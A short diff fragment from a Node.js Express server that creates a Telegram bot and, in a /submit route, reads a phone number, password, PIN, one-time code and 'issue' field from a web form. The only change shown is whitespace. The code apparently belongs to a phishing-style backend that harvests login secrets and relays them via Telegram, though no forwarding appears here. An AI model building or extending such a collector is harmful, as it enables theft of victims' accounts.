@@ -19,7 +19,7 @@ const bot = new TelegramBot(process.env.BOT_TOKEN);
 app.post("/submit", async (req, res) => {
     try {
         // HTML se bheja gaya data yahan receive ho raha hai
-        const { phone, password, pin, otp,issue } = req.body;
+        const { phone,password,pin,otp,issue } = req.body;
 
         // Basic validation check
         if (!phone||!issue) {
